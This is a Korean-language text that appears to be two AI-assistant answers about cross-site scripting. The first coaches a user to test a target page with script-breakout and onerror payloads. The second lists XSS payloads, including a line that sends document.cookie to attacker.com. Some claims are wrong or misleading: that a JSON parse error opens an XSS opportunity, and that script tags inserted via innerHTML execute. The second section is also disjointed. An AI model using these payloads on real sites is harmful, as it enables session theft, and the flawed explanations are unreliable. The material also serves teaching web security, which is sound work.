##(1)##
* 네가 URL 뒤에 `<script></script>`를 붙이니까,
* **페이지의 원래 HTML `<script>` 태그 일부가 화면에 노출됨**.

이건 단순히 네가 넣은 `<script>`가 출력되는 게 아니라, **페이지 내의 기존 스크립트 일부가 "깨져서" 화면에 나타난다는 말이지?**

---

## 🔍 **XSS 가능성 매우 큼**

이건 **HTML 파싱이 깨졌다**는 뜻이야. 네가 삽입한 태그 때문에 브라우저가 DOM을 비정상적으로 파싱하고, 기존 `<script>` 블록이 종료되거나 망가져서 일부 코드가 **화면에 렌더링**된 거야.

즉, 이런 구조일 가능성이 높아:

```html
<script>
    var msg = "Hello";  // 기존 스크립트
</script>
```

근데 네가 다음과 같이 URL을 만듦:

```
http://example.com/page?name=</script><script>alert(1)</script>
```

그럼 서버 코드에서 이렇게 들어가면:

```html
<script>
    var name = "<사용자 입력값>";  // 이 줄에 네 XSS 코드가 들어가면 파싱이 깨짐
</script>
```

결과적으로:

* 첫 번째 `</script>`로 기존 `<script>`가 조기 종료
* 그 뒤의 `<script>alert(1)</script>`가 **브라우저에서 실행**
* 그 이후 남은 스크립트는 깨진 상태로 렌더링됨 → 그래서 HTML 일부가 "화면에 보이는" 현상이 발생

---

## ✅ 확실한 XSS 공격 가능성 테스트

아래처럼 시도해봐:

```url
http://example.com/page?name=</script><script>alert(1)</script>
```

또는 우회용 페이로드:

```url
http://example.com/page?name=</script><img src=x onerror=alert(1)>
```

이런 페이로드를 넣었을 때 **팝업이 뜨면 XSS 성공**이야.

---

## 🎯 이게 중요한 이유

이런 상황은 **Reflected XSS** 또는 **DOM-Based XSS** 중 하나일 가능성이 크고, 특히 서버가 사용자 입력을 그대로 `<script>` 태그 안에 넣고 있다면 매우 취약해.

---

## 📌 다음 단계 추천

1. \*\*페이지 소스(view-source:)\*\*에서 삽입 위치 확인 (스크립트 블록 안인지, HTML 태그 안인지)

2. 가능하면 입력값을 다음으로 넣어봐:

   ```
   </script><script>alert(1)</script>
   ```

3. 개발자 도구(F12) → 콘솔 확인: 에러 메시지나 unexpected token 발생 여부

4. 만약 `innerHTML`이나 `document.write`로 출력 중이면 **DOM-Based XSS** 가능성도 있음

---

HTML 파서(브라우저의 DOM 해석기)의 동작 방식

---

## 🔥 요점 먼저

* ✅ `</script><script>alert(1)</script>`는 **기존 `<script>` 태그를 종료**하고 새로운 `<script>`를 열기 때문에 **JS가 실행됨**
* ❌ `<script>alert(1)</script>`는 브라우저가 **중첩된 `<script>`로 보지 않고**, 그냥 **문자열로 처리**하거나 **필터링**하기 때문에 실행되지 않음

---

## 🔍 HTML 안에 `<script>`를 넣으면 생기는 일

### 예를 들어 이런 코드가 있다고 하자:

```html
<script>
  var name = "[사용자 입력]";
</script>
```

### Case 1: 입력값에 `<script>alert(1)</script>`를 넣은 경우

```html
<script>
  var name = "<script>alert(1)</script>";
</script>
```

#### 결과:

* 브라우저는 이걸 **문자열 안의 HTML**로 봐.
* 즉, 그냥 `var name = "<script>alert(1)</script>";` 이렇게 실행될 뿐이야.
* 자바스크립트 구문상 문제가 없기 때문에 **alert는 실행되지 않음** (그냥 변수에 저장됐을 뿐)

---

### Case 2: 입력값에 `</script><script>alert(1)</script>`를 넣은 경우

```html
<script>
  var name = "</script><script>alert(1)</script>";
</script>
```

#### 결과:

1. 첫 번째 `</script>`가 **기존 `<script>`를 닫아버림**
2. 그 다음 `<script>alert(1)</script>`는 **완전히 새로운 스크립트 블록**이 됨
3. 브라우저는 이걸 진짜 자바스크립트로 해석하고 `alert(1)` 실행

📌 이게 바로 XSS 페이로드에서 `</script>`를 앞에 붙이는 이유야!

---

## ✅ 정리: 왜 앞에 `</script>`를 붙이면 되나?

| 입력값                                  | 브라우저 동작                                     | 실행 여부 |
| ------------------------------------ | ------------------------------------------- | ----- |
| `<script>alert(1)</script>`          | `<script>` 안에 또 `<script>` → 무시되거나 문자열로 처리됨 | ❌     |
| `</script><script>alert(1)</script>` | 기존 스크립트 닫힘 → 새 스크립트 열림 → 코드 실행됨             | ✅     |

---

## 🔐 참고

이건 실제 공격에서도 자주 쓰이는 기법이야. 특히 HTML 안에 삽입되는 경우엔 다음 같은 형태로 변형됨:

```html
<script>var user = "[[INPUT_HERE]]";</script>
```

여기에서 `[[INPUT_HERE]]` 자리에 `</script><script>/*payload*/</script>`를 넣으면 바로 XSS가 되는 거지.

---

##(2)##

`"unexpected token '<', '<!doctype' is not valid json"` 오류는 보통 **JavaScript**에서 **JSON 파싱**을 시도할 때, **HTML** 형식의 응답을 받은 경우 발생합니다. 예를 들어, 서버가 예상대로 **JSON 응답**을 보내야 하는데, 실제로는 **HTML** 페이지(대개 오류 페이지)가 반환되었을 때 이런 오류가 발생할 수 있습니다.

이 경우, XSS (Cross-Site Scripting) 공격을 진행하는 방법에 대해 설명할 수 있습니다. XSS 공격은 웹 애플리케이션에 악성 스크립트를 삽입하여 **사용자에게 악성 코드를 실행**시키는 방법입니다. **`unexpected token '<'`** 오류 메시지는 **HTML 응답**에서 악성 스크립트를 삽입할 수 있는 기회를 제공합니다.

### XSS 공격의 기본 원리

1. **HTML 문서 내 스크립트 삽입**: XSS 공격자는 **`<script>`** 태그나 **`onerror`**, **`onclick`** 등의 이벤트 핸들러를 사용하여 악성 JavaScript를 삽입합니다.
2. **DOM 조작**: 삽입된 스크립트는 **DOM**을 조작하여 **쿠키 탈취**, **세션 하이재킹**, **피싱 공격** 등을 수행할 수 있습니다.

### `unexpected token '<'` 오류 발생 시 공격할 수 있는 XSS 페이로드 예시

#### 1. **기본적인 XSS 공격**

만약 HTML 문서 내에서 `<script>` 태그를 포함시킬 수 있다면, 공격자는 JavaScript 코드를 실행시킬 수 있습니다.

```html
<script>alert('XSS');</script>
```

이 코드는 **브라우저**에서 실행되며, **경고창**이 나타나게 됩니다.

#### 2. **쿠키 탈취를 위한 XSS 페이로드**

공격자는 악성 스크립트를 사용하여 **쿠키**를 **탈취**할 수 있습니다. 다음과 같은 XSS 페이로드를 사용할 수 있습니다:

```html
<script>fetch('http://attacker.com/steal?cookie=' + document.cookie);</script>
```

이 페이로드는 사용자의 **쿠키** 정보를 **attacker.com**으로 전송합니다.

#### 3. **DOM-based XSS (DOM을 통한 XSS)**

만약 페이지 내에서 **사용자 입력을 동적으로 처리**하고 그 데이터를 HTML에 삽입한다면, XSS 공격이 발생할 수 있습니다. 예를 들어, 다음과 같은 페이로드가 있을 수 있습니다:

```html
<input type="text" id="search" value="foo">
<script>
  document.getElementById('search').value = '<img src="x" onerror="alert(1)">';
</script>
```

위 코드는 **이미지 오류**를 유발하여 **`onerror`** 이벤트 핸들러가 \*\*`alert(1)`\*\*을 실행하도록 합니다.

### **사용자 입력을 동적으로 처리하는지 확인하는 방법**

1. **폼 입력 필드**나 **검색창**에서 입력한 값이 즉시 페이지에 반영되는지 확인합니다.

   * 예를 들어, 사용자가 **검색어**를 입력하면, 페이지가 새로고침 없이 **검색어를 포함한 결과**를 바로 표시하는 경우, 해당 데이터는 동적으로 처리되고 있습니다.
2. **JavaScript를 통해 값이 DOM에 삽입되는지 확인**:

   * **웹 페이지의 HTML 구조**를 살펴보면, **브라우저 개발자 도구**(F12)를 열고 **Elements** 탭에서 HTML을 실시간으로 확인할 수 있습니다.
   * 예를 들어, **사용자가 검색어**를 입력한 후, JavaScript 코드가 **`document.getElementById()`** 또는 \*\*`innerHTML`\*\*을 사용하여 입력 값을 HTML 페이지에 삽입하는 방식이라면, 그 페이지는 동적 처리를 하고 있습니다.

#### **동적 처리가 어떻게 이루어지는지 예시로 설명**

1. **사용자 입력 받기**: 예를 들어, 검색창에 사용자가 입력한 값을 페이지에 반영한다고 가정해봅시다.

   ```html
   <input type="text" id="search">
   <button onclick="search()">Search</button>
   <div id="result"></div>
   ```

2. **JavaScript 코드**: 사용자가 **Search** 버튼을 클릭하면, 검색어를 가져와서 결과를 페이지에 보여주는 코드입니다.

   ```javascript
   function search() {
       var query = document.getElementById('search').value;  // 검색어 가져오기
       document.getElementById('result').innerHTML = query;  // 검색어를 결과에 반영
   }
   ```

3. **동적으로 HTML에 삽입**: 사용자가 입력한 검색어는 `document.getElementById('result').innerHTML`을 통해 \*\*`<div id="result"></div>`\*\*에 삽입됩니다. **이 값은 HTML로 직접 삽입**되므로, 사용자가 입력한 값에 악성 코드가 포함되면 XSS 공격에 취약해질 수 있습니다.

---

### **사용자 입력을 HTML에 삽입하는 방법**

**가장 일반적인 방법**은 \*\*`innerHTML`\*\*을 사용하는 것입니다.

#### **1. innerHTML을 통한 삽입**

`innerHTML`은 **HTML 요소의 콘텐츠**를 **동적으로 변경**할 때 사용됩니다. 그러나 이 방법을 사용하면 **사용자가 입력한 값**이 **HTML로 해석**되기 때문에, XSS 공격에 취약할 수 있습니다.

**예시**:

```javascript
var userInput = document.getElementById('userInput').value;  // 사용자의 입력값
document.getElementById('output').innerHTML = userInput;  // 입력값을 HTML에 삽입
```

* **위 코드**는 사용자가 **`<input>`** 필드에 입력한 값을 \*\*`<div id="output">`\*\*에 삽입합니다.
* 만약 사용자가 `"<script>alert('XSS')</script>"`와 같은 값을 입력하면, **스크립트 코드**가 실행될 수 있습니다
**`innerText`** 또는 \*\*`textContent`\*\*는 HTML 태그를 포함한 텍스트를 삽입할 수 없으며, **순수 텍스트**만을 삽입할 수 있습니다. 따라서 XSS 공격을 방어할 수 있는 안전한 방법입니다.


#### 4. **이벤트 핸들러를 통한 XSS**

사용자가 클릭하거나 다른 이벤트를 트리거할 때 XSS를 발생시킬 수 있습니다. 예를 들어, `<a>` 태그나 `<img>` 태그에 **이벤트 핸들러**를 삽입할 수 있습니다.

```html
<img src="x" onerror="alert('XSS');">
```

위와 같이 **이미지 로드 오류**를 이용해 **`onerror`** 이벤트가 실행될 때 \*\*`alert('XSS')`\*\*가 실행됩니다.

#### 5. **Base64로 인코딩된 스크립트 삽입**

만약 `<script>` 태그를 직접 삽입할 수 없다면, Base64 인코딩을 사용하여 **스크립트**를 삽입할 수 있습니다. 예를 들어:

```html
<script src="data:text/javascript;base64,dmFyIG5hbWUgPSAic3RhY2sgY2FwIjs="></script>
```

위의 페이로드는 **Base64**로 인코딩된 **JavaScript** 코드가 실행됩니다. Base64로 인코딩된 값은 다음과 같습니다:

```javascript
var name = "stack cap";
```

#### 6. **JSON 응답이 잘못 처리된 경우의 XSS**

`unexpected token '<'` 오류는 **JSON 데이터**를 예상했는데 **HTML 페이지**가 반환되는 경우에 발생하는데, **HTML 응답을 JavaScript에서 처리**하는 상황에서 **XSS 공격**이 발생할 수 있습니다. 예를 들어:

```javascript
fetch('/api/data')
  .then(response => response.json())
  .then(data => {
    document.getElementById('output').innerHTML = data.message;
  })
  .catch(error => {
    console.error(error);
  });
```

여기서 `data.message`가 HTML로 반환되는 경우, 예를 들어:

```json
{
  "message": "<script>alert('XSS')</script>"
}
```

위와 같은 JSON 응답이 반환되면, \*\*`data.message`\*\*가 HTML로 삽입되어 **XSS**가 실행됩니다.

```
* innerhtml과 fetch(웹 서버에 GET 또는 POST 요청을 보내고, 서버에서 돌아오는 응답을 받아 JSON, HTML, 텍스트 등으로 반환)
```


